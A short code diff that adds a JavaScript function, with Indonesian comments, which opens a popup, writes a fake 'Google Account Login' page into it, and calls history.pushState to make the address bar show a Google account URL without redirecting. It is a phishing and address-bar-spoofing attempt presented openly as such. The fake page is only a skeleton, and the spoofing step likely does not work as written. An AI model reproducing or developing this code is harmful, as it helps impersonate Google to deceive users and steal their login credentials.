@@ -1,0 +1,24 @@
+<script>
+function f() {
+    w = window.open("about:blank");
+    
+    // Tunggu popup terbuka, lalu manipulasi
+    setTimeout(() => {
+        // Tulis konten palsu di popup
+        w.document.write(`
+            <html>
+            <head><title>Google Account</title></head>
+            <body>
+                <h1>Google Account Login</h1>
+                <p>This is a fake login page</p>
+                <!-- Tambahkan elemen yang mirip dengan aslinya -->
+            </body>
+            </html>
+        `);
+        
+        // Manipulasi URL di address bar TANPA redirect
+        w.history.pushState({}, "Google Account", "https://account.google.com");
+        
+    }, 100);
+}
+</script>
